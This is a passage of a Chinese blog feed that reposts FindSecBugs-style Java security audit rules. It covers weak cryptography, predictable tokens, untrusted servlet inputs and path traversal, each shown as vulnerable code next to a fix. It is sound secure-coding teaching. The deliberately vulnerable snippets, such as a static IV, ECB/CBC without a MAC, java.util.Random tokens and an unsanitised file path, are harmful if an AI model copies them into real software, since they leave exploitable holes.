href="http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html" target="_blank" rel="noopener">Dinis Cruz Blog: Using XMLDecoder to execute server-side Java Code on an Restlet application</a><br><a href="https://securityblog.redhat.com/2014/01/23/java-deserialization-flaws-part-2-xml-deserialization/" target="_blank" rel="noopener">RedHat blog : Java deserialization flaws: Part 2, XML deserialization</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="固定IV"><a href="#固定IV" class="headerlink" title="固定IV"></a>固定IV</h1><p>漏洞规则：STATIC_IV<br>每一条消息都应该为它初始化生成一个新的加密向量<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">private static byte[] IV = new byte[16] &#123;(byte)0,(byte)1,(byte)2,[...]&#125;;</span><br><span class="line"></span><br><span class="line">public void encrypt(String message) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivSpec = new IvParameterSpec(IV);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>解决方案:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public void encrypt(String message) throws Exception &#123;</span><br><span class="line"></span><br><span class="line">    byte[] iv = new byte[16];</span><br><span class="line">    new SecureRandom().nextBytes(iv);</span><br><span class="line"></span><br><span class="line">    IvParameterSpec ivSpec = new IvParameterSpec(iv);</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Initialization_vector" target="_blank" rel="noopener">Wikipedia: Initialization vector</a><br><a href="http://cwe.mitre.org/data/definitions/329.html" target="_blank" rel="noopener">CWE-329: Not Using a Random IV with CBC Mode</a><br><a href="https://defuse.ca/cbcmodeiv.htm" target="_blank" rel="noopener">Encryption - CBC Mode IV: Secret or Not?</a></p><h1 id="ECB模式是不安全的"><a href="#ECB模式是不安全的" class="headerlink" title="ECB模式是不安全的"></a>ECB模式是不安全的</h1><p>漏洞规则： ECB_MODE</p><p>提供了最好机密性的授权加密模式应该替换电码本模式(Electronic Codebook Book (ECB))，因为ecb没有提供很好的机密性。尤其，在ecb模式下，输入相同的数据，每一次的输出也是相同的。所以，如果用户发送一个密码，它的加密值每次都是相同的。这允许攻击者可以去拦截并且也可也重放这些数据<br>为了修复这个。一些像Galois/Counter Mode (GCM)也应该被替换<br>有漏洞的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://en.wikipedia.org/wiki/Block_cipher_modes_of_operation#Electronic_codebook_.28ECB.29" target="_blank" rel="noopener">Wikipedia: Block cipher modes of operation</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-38a/sp800-38a.pdf" target="_blank" rel="noopener">NIST: Recommendation for Block Cipher Modes of Operation</a></p><h1 id="加密容易受到Padding-Oracle的影响"><a href="#加密容易受到Padding-Oracle的影响" class="headerlink" title="加密容易受到Padding Oracle的影响"></a>加密容易受到Padding Oracle的影响</h1><p>漏洞特征：PADDING_ORACLE<br>具有PKCS5Padding的CBC特定模式容易受到padding oracle攻击。如果系统暴露了的明文数据与有效padding或无效padding之间的差异。那么攻击者就可能会解密数据。有效padding和无效padding的差别通常可以通过每一次返回的报错信息来揭露。<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://www.infobytesec.com/down/paddingoracle_openjam.pdf" target="_blank" rel="noopener">Padding Oracles for the masses (by Matias Soler)</a><br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01/" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://capec.mitre.org/data/definitions/463.html" target="_blank" rel="noopener">CAPEC: Padding Oracle Crypto Attack</a><br><a href="http://cwe.mitre.org/data/definitions/696.html" target="_blank" rel="noopener">CWE-696: Incorrect Behavior Order</a></p><h1 id="密码没有完整性"><a href="#密码没有完整性" class="headerlink" title="密码没有完整性"></a>密码没有完整性</h1><p>漏洞特征：CIPHER_INTEGRITY<br>产生的密文容易被对手改变。这就意味着，加密提供者没法发现数据是否遭到篡改。如果加密数据被攻击者控制，那么它可能会被偷偷改掉。<br>解决方案通常是加密数据通常包含基本的身份验证hash(HMAC) 去签名数据。把HMAC方法和现有的加密方式结合容易出错。尤其，推荐你要首先去验证HMAC，并且如果数据没有被篡改，你才能执行所有的解密操作。<br>如果没有提供HMAC，下面的模式都是有漏洞的：</p><ul><li>CBC</li><li>OFB</li><li>CTR</li><li>ECB<br>下面的片段是一些有漏洞的代码:<br>有漏洞的代码<br>aes的cbc模式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/CBC/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>三次DES的ECB模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;DESede/ECB/PKCS5Padding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Cipher c = Cipher.getInstance(&quot;AES/GCM/NoPadding&quot;);</span><br><span class="line">c.init(Cipher.ENCRYPT_MODE, k, iv);</span><br><span class="line">byte[] cipherText = c.doFinal(plainText);</span><br></pre></td></tr></table></figure><p>在上面这个例子中，GCM模式把HMAC引入到加密数据的结果之中，提供了结果的完整性<br>引用：<br><a href="http://en.wikipedia.org/wiki/Authenticated_encryption" target="_blank" rel="noopener">Wikipedia: Authenticated encryption</a><br><a href="http://csrc.nist.gov/groups/ST/toolkit/BCM/modes_development.html#01" target="_blank" rel="noopener">NIST: Authenticated Encryption Modes</a><br><a href="http://www.thoughtcrime.org/blog/the-cryptographic-doom-principle/" target="_blank" rel="noopener">Moxie Marlinspike’s blog: The Cryptographic Doom Principle</a><br><a href="http://cwe.mitre.org/data/definitions/353.html" target="_blank" rel="noopener">CWE-353: Missing Support for Integrity Check</a></p><h1 id="使用ESAPI加密"><a href="#使用ESAPI加密" class="headerlink" title="使用ESAPI加密"></a>使用ESAPI加密</h1><p>漏洞规则：ESAPI_ENCRYPTOR<br>ESAPI的加密组件在历史上有一些小的漏洞。这里有一个能够快速验证的列表，以保证授权的加密是以期望的方式运行的。</p><ol><li>库的版本</li></ol><p>这个问题在2.1.0这个版本被修正。在2.0.1版本以下有漏洞可以绕过MAC（CVE-2013-5679）<br>对于Maven使用者，使用下面的命令可以查看插件的版本。有效的ESAPI将会被输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ mvn versions:display-dependency-updates</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">[INFO] The following dependencies in Dependencies have newer versions:</span><br><span class="line">[INFO]   org.slf4j:slf4j-api ................................... 1.6.4 -&gt; 1.7.7</span><br><span class="line">[INFO]   org.owasp.esapi:esapi ................................. 2.0.1 -&gt; 2.1.0</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>或者可以直接查看配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.owasp.esapi&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;esapi&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>对于Ant使用者，应该使用 <a href="http://repo1.maven.org/maven2/org/owasp/esapi/esapi/2.1.0/esapi-2.1.0.jar" target="_blank" rel="noopener">esapi-2.1.0.jar</a> 这个jar。</p><p>2.配置<br>在2.1.0这个版本中，在密文定义中，密钥的改变会导致漏洞(CVE-2013-5960)。需要使用一些预防措施。<br>如果存在以下任何元素，那么ESAPI的加密算法就是有问题的<br>不安全的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Encryptor.CipherText.useMAC=false</span><br><span class="line"></span><br><span class="line">Encryptor.EncryptionAlgorithm=AES</span><br><span class="line">Encryptor.CipherTransformation=AES/CBC/PKCS5Padding</span><br><span class="line"></span><br><span class="line">Encryptor.cipher_modes.additional_allowed=CBC</span><br></pre></td></tr></table></figure><p>安全的配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#Needed</span><br><span class="line">Encryptor.CipherText.useMAC=true</span><br><span class="line"></span><br><span class="line">#Needed to have a solid auth. encryption</span><br><span class="line">Encryptor.EncryptionAlgorithm=AES</span><br><span class="line">Encryptor.CipherTransformation=AES/GCM/NoPadding</span><br><span class="line"></span><br><span class="line">#CBC mode should be removed to avoid padding oracle</span><br><span class="line">Encryptor.cipher_modes.additional_allowed=</span><br></pre></td></tr></table></figure><p>引用：<br><a href="http://owasp-esapi-java.googlecode.com/svn/trunk/documentation/ESAPI-security-bulletin1.pdf" target="_blank" rel="noopener">ESAPI Security bulletin 1 (CVE-2013-5679)</a><br><a href="http://nvd.nist.gov/view/vuln/detail?vulnId=CVE-2013-5679" target="_blank" rel="noopener">Vulnerability Summary for CVE-2013-5679</a><br><a href="http://www.synacktiv.com/ressources/synacktiv_owasp_esapi_hmac_bypass.pdf" target="_blank" rel="noopener">Synactiv: Bypassing HMAC validation in OWASP ESAPI symmetric encryption</a><br><a href="http://cwe.mitre.org/data/definitions/310.html" target="_blank" rel="noopener">CWE-310: Cryptographic Issues</a><br><a href="http://lists.owasp.org/pipermail/esapi-dev/2015-March/002533.html" target="_blank" rel="noopener">ESAPI-dev mailing list: Status of CVE-2013-5960</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Java审计-DAY3&quot;&gt;&lt;a href=&quot;#Java审计-DAY3&quot; class=&quot;headerlink&quot; title=&quot;Java审计-DAY3&quot;&gt;&lt;/a&gt;Java审计-DAY3&lt;/h1&gt;&lt;p&gt;转载自 &lt;a href=&quot;https://blog.csdn.net
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java审计-DAY1</title>
    <link href="http://bai-ren-1.github.io/2019/12/02/Java%E5%AE%A1%E8%AE%A1-DAY1/"/>
    <id>http://bai-ren-1.github.io/2019/12/02/Java%E5%AE%A1%E8%AE%A1-DAY1/</id>
    <published>2019-12-02T06:56:43.000Z</published>
    <updated>2020-03-06T09:29:09.745Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java审计-DAY1"><a href="#Java审计-DAY1" class="headerlink" title="Java审计-DAY1"></a>Java审计-DAY1</h1><p>本文转载自 <a href="https://blog.csdn.net/niexinming/article/details/84264261" target="_blank" rel="noopener">https://blog.csdn.net/niexinming/article/details/84264261</a> </p><h1 id="可预测的伪随机数发生器"><a href="#可预测的伪随机数发生器" class="headerlink" title="可预测的伪随机数发生器"></a>可预测的伪随机数发生器</h1><p>漏洞特征：<code>PREDICTABLE_RANDOM</code><br>在某些关键的安全环境中使用可预测的随机数可能会导致漏洞，比如，当这个值被作为：</p><ul><li>csrf token；如果攻击者可以预测csrf的token值的话，就可以发动csrf攻击</li><li>重置密码的token（通过邮件发送）；如果重置密码的token被替换的话，那么就会导致用户账户被接管，因为攻击者会猜测到重置密码的链接。</li><li>其他包含秘密的信息</li></ul><p>修复这个漏洞最快的方式是用强随机数生成器（ 比如：<code>java.security.SecureRandom</code>）替换掉<br><code>java.util.Random</code></p><p>有漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">String <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Random r = <span class="keyword">new</span> Random();</span><br><span class="line">    <span class="keyword">return</span> Long.toHexString(r.nextLong());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.codec.binary.Hex;</span><br><span class="line"></span><br><span class="line"><span class="function">String <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    SecureRandom secRandom = <span class="keyword">new</span> SecureRandom();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">byte</span>[] result = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">32</span>];</span><br><span class="line">    secRandom.nextBytes(result);</span><br><span class="line">    <span class="keyword">return</span> Hex.encodeHexString(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">123456789</span></span><br></pre></td></tr></table></figure><p>引用：</p><p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html" target="_blank" rel="noopener">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br><a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers" target="_blank" rel="noopener">CERT: MSC02-J. Generate strong random numbers</a><br><a href="http://cwe.mitre.org/data/definitions/330.html" target="_blank" rel="noopener">CWE-330: Use of Insufficiently Random Values</a><br><a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html" target="_blank" rel="noopener">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a></p><h1 id="可预测的伪随机数发生器（Scala）"><a href="#可预测的伪随机数发生器（Scala）" class="headerlink" title="可预测的伪随机数发生器（Scala）"></a>可预测的伪随机数发生器（Scala）</h1><p>漏洞特征：<code>PREDICTABLE_RANDOM_SCALA</code><br>在某些关键的安全环境中使用可预测的随机数可能会导致漏洞，比如，当这个值被作为：</p><ul><li>csrf token；如果攻击者可以预测csrf的token值的话，就可以发动csrf攻击</li><li>重置密码的token（通过邮件发送）；如果重置密码的token被替换的话，那么就会导致用户账户被接管，因为攻击者会猜测到重置密码的链接。</li><li>其他包含秘密的信息</li></ul><p>修复这个漏洞最快的方式是用强随机数生成器（ 比如：<code>java.security.SecureRandom</code>）替换掉<br><code>java.util.Random</code><br>有漏洞的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> scala.util.Random</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    val result = Seq.fill(<span class="number">16</span>)(Random.nextInt)</span><br><span class="line">    <span class="keyword">return</span> result.map(<span class="string">"%02x"</span> format _).mkString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.security.SecureRandom</span><br><span class="line"></span><br><span class="line"><span class="function">def <span class="title">generateSecretToken</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    val rand = <span class="keyword">new</span> SecureRandom()</span><br><span class="line">    val value = Array.ofDim[Byte](<span class="number">16</span>)</span><br><span class="line">    rand.nextBytes(value)</span><br><span class="line">    <span class="keyword">return</span> value.map(<span class="string">"%02x"</span> format _).mkString</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="http://jazzy.id.au/default/2010/09/20/cracking_random_number_generators_part_1.html" target="_blank" rel="noopener">Cracking Random Number Generators - Part 1 (http://jazzy.id.au)</a><br><a href="https://www.securecoding.cert.org/confluence/display/java/MSC02-J.+Generate+strong+random+numbers" target="_blank" rel="noopener">CERT: MSC02-J. Generate strong random numbers</a><br><a href="http://cwe.mitre.org/data/definitions/330.html" target="_blank" rel="noopener">CWE-330: Use of Insufficiently Random Values</a><br><a href="http://blog.h3xstream.com/2014/12/predicting-struts-csrf-token-cve-2014.html" target="_blank" rel="noopener">Predicting Struts CSRF Token (Example of real-life vulnerability and exploitation)</a></p><h1 id="没有做任何安全检查的servlet-参数"><a href="#没有做任何安全检查的servlet-参数" class="headerlink" title="没有做任何安全检查的servlet 参数"></a>没有做任何安全检查的servlet 参数</h1><p>漏洞特征：<code>SERVLET_PARAMETER</code><br>Servlet 会从各种函数中获取到GET和POST的值。这些被获取的值肯定是不安全的。在进入到敏感的api函数之前你可能需要验证和过滤这些值：</p><ul><li>sql 查询 （可能导致sql注入）</li><li>文件操作 （ 可能会导致目录穿越 ）</li><li>命令执行 （ 可能会导致命令注入 ）</li><li>html解析 （可能会导致xss)</li><li>其他的</li></ul><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查Content-Type-头"><a href="#没有做任何安全检查Content-Type-头" class="headerlink" title="没有做任何安全检查Content-Type 头"></a>没有做任何安全检查Content-Type 头</h1><p>漏洞特征：SERVLET_CONTENT_TYPE<br>服务器端程序通过客户端收集http的Content-Type的值。这个值可能会影响影响应用的安全性</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查Hostname-头"><a href="#没有做任何安全检查Hostname-头" class="headerlink" title="没有做任何安全检查Hostname 头"></a>没有做任何安全检查Hostname 头</h1><p>漏洞特征： SERVLET_SERVER_NAME<br>服务器端程序通过客户端收集http的hostname 的值。这个值可能会影响影响应用的安全性。<code>ServletRequest.getServerName()</code>和 <code>HttpServletRequest.getHeader(&quot;Host&quot;)</code>的行为很相似，都是从http头部中获取到host的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GET /testpage HTTP/1.1</span><br><span class="line">Host: www.example.com</span><br><span class="line">[...]</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>默认情况下，web容器可能会直接将请求重定向到你的应用程序中。这就允许用户把恶意的请求放入http的host头中。我建议你不要信任来自客户端的任何输入。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的session-cookie值"><a href="#没有做任何安全检查的session-cookie值" class="headerlink" title="没有做任何安全检查的session cookie值"></a>没有做任何安全检查的session cookie值</h1><p>漏洞特征： SERVLET_SESSION_ID<br><code>HttpServletRequest.getRequestedSessionId()</code>( <a href="http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getRequestedSessionId()" target="_blank" rel="noopener">http://docs.oracle.com/javaee/6/api/javax/servlet/http/HttpServletRequest.html#getRequestedSessionId()</a> )函数返回cookie中JSESSIONID的值。这个值通常被session 管理器访问，而不是开发者代码。<br>传递给客户端的值通常是字母数字（ 例如：JSESSIONID=jp6q31lq2myn ），无论如何，这个值可以被客户端改变，下面的http请求展示了潜在的危险</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /somePage HTTP/1.1</span><br><span class="line">Host: yourwebsite.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Cookie: JSESSIONID=Any value of the user&apos;s choice!!??&apos;&apos;&apos;&quot;&gt;</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>像这样，JSESSIONID应该仅被使用判断是否与存在的session ID相匹配，如果不存在对应的session ID，那么这个用户就可能会是未授权用户。此外， session ID的值应该从来不被记录，如果记录了，那么日志文件中就会包含有效的且在激活状态的session IDs，这样就会允许内部员工可以通过日志记录来劫持任意在线用户。</p><p>引用：</p><p><a href="https://www.owasp.org/index.php/Session_Management_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Session Management Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查的查询字符串"><a href="#没有做任何安全检查的查询字符串" class="headerlink" title="没有做任何安全检查的查询字符串"></a>没有做任何安全检查的查询字符串</h1><p>漏洞特征： SERVLET_QUERY_STRING<br>查询字符串是get请求中参数名和参数值的串联，可以传入预期之外的参数。 比如URL请求：/app/servlet.htm?a=1&amp;b=2 ，查询字符串就是a=1&amp;b=2<br>通过函数 HttpServletRequest.getParameter() 接收每一个传递进来的参数的值，通过 HttpServletRequest.getQueryString() 这个函数获取到的值应该被看做不安全的。你应该在查询字符串进入敏感函数之前去充分的效验和过滤它们。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="没有做任何安全检查的HTTP头"><a href="#没有做任何安全检查的HTTP头" class="headerlink" title="没有做任何安全检查的HTTP头"></a>没有做任何安全检查的HTTP头</h1><p>漏洞特征：SERVLET_HEADER<br>http请求头很容易会被用户所修改。通常，不要假想请求来自于没有被黑客修改的常规浏览器。我建议你，不要相信客户端传递进来的http头部值</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的Referer值"><a href="#没有做任何安全检查的Referer值" class="headerlink" title="没有做任何安全检查的Referer值"></a>没有做任何安全检查的Referer值</h1><p>漏洞特征：SERVLET_HEADER_REFERER<br>行为：</p><ul><li>如果请求来自于恶意用户，那么Referer的值会是任意的情况。</li><li>如果请求来自于另一个安全的源（https），那么Referer头就是空的。</li></ul><p>建议：</p><ul><li>访问控制不应该基于此标头的值。</li><li>csrf保护不应该仅基于此值。（ <a href="http://www.w3.org/Protocols/HTTP/HTRQ_Headers.html#z14" target="_blank" rel="noopener">因为这个选项</a> ）</li></ul><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的User-Agent值"><a href="#没有做任何安全检查的User-Agent值" class="headerlink" title="没有做任何安全检查的User-Agent值"></a>没有做任何安全检查的User-Agent值</h1><p>漏洞特征： SERVLET_HEADER_USER_AGENT<br>“User-Agent” 很容易被客户端伪造，不建议基于不同的User-Agent（比如爬虫的UA）来适配不同的行为。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="潜在的cookie中包含敏感数据"><a href="#潜在的cookie中包含敏感数据" class="headerlink" title="潜在的cookie中包含敏感数据"></a>潜在的cookie中包含敏感数据</h1><p>漏洞特征： COOKIE_USAGE<br>存储在客户端中cookie的数据不应该包含敏感数据或者与session相关的数据。大多数情况下，敏感数据应该仅仅存储在session中，并且通过通过用户的session值去访问。详细请看HttpSession (HttpServletRequest.getSession())<br>客户端cookie应该是比特定会话维持时间更长且独立于特殊会话</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/315.html" target="_blank" rel="noopener">CWE-315: Cleartext Storage of Sensitive Information in a Cookie</a></p><h1 id="潜在的路径穿越（文件读取）"><a href="#潜在的路径穿越（文件读取）" class="headerlink" title="潜在的路径穿越（文件读取）"></a>潜在的路径穿越（文件读取）</h1><p>漏洞特征：PATH_TRAVERSAL_IN<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@GET</span><br><span class="line">@Path(&quot;/images/&#123;image&#125;&quot;)</span><br><span class="line">@Produces(&quot;images/*&quot;)</span><br><span class="line">public Response getImage(@javax.ws.rs.PathParam(&quot;image&quot;) String image) &#123;</span><br><span class="line">    File file = new File(&quot;resources/images/&quot;, image); //Weak point</span><br><span class="line"></span><br><span class="line">    if (!file.exists()) &#123;</span><br><span class="line">        return Response.status(Status.NOT_FOUND).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Response.ok().entity(new FileInputStream(file)).build();</span><br><span class="line">&#125;</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.io.FilenameUtils;</span><br><span class="line"></span><br><span class="line">@GET</span><br><span class="line">@Path(&quot;/images/&#123;image&#125;&quot;)</span><br><span class="line">@Produces(&quot;images/*&quot;)</span><br><span class="line">public Response getImage(@javax.ws.rs.PathParam(&quot;image&quot;) String image) &#123;</span><br><span class="line">    File file = new File(&quot;resources/images/&quot;, FilenameUtils.getName(image)); //Fix</span><br><span class="line"></span><br><span class="line">    if (!file.exists()) &#123;</span><br><span class="line">        return Response.status(Status.NOT_FOUND).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Response.ok().entity(new FileInputStream(file)).build();</span><br><span 